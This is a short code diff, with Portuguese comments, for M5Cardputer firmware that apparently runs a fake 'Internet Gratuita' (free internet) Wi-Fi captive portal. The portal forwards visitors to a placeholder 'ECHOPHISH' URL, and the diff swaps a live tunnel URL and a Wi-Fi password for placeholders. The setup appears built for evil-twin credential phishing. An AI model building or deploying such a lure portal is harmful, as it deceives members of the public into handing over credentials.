@@ -16,12 +16,12 @@
 // Configurações do captive portal
 String portalTitle = "Internet Gratuita";
 String portalSSID = "Internet Gratuita";
-String portalURL = "https://laboratories-daily-tahoe-languages.trycloudflare.com";
-String portalHost = "laboratories-daily-tahoe-languages.trycloudflare.com";
+String portalURL = "PLACE_ECHOPHISH_URL_HERE.COM.BR";
+String portalHost = portalURL;
 
 // Configurações de internet
-String internetSSID = "_";
-String internetPassword = "Qualeasenha";
+String internetSSID = "WIFI_SSID_FOR_INTERNET_CONNECTION";
+String internetPassword = "WIFI_PASSWORD_FOR_INTERNET_CONNECTION";
 bool internetConnected = false;
 
 int totalHits = 0;
@@ -778,7 +778,7 @@ void printHomeScreen() {
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println(" PROXY ATIVO ");
+  DISP.println(" zPortal ATIVO ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.printf("Portal: %s\n", portalTitle.c_str());
   DISP.printf("SSID: %s\n", portalSSID.c_str());
@@ -1141,6 +1141,10 @@ void handleMenu() {
 void setup() {
   Serial.begin(115200);
   delay(1000);
+
+  
+  portalHost.replace("https://", "");
+  portalHost.replace("http://", "");
   
   auto cfg = M5.config();
   M5Cardputer.begin(cfg);
@@ -1152,7 +1156,7 @@ void setup() {
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println(" PROXY DEFINITIVO ");
+  DISP.println(" zPortal ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.println("Iniciando...");
   delay(2000);
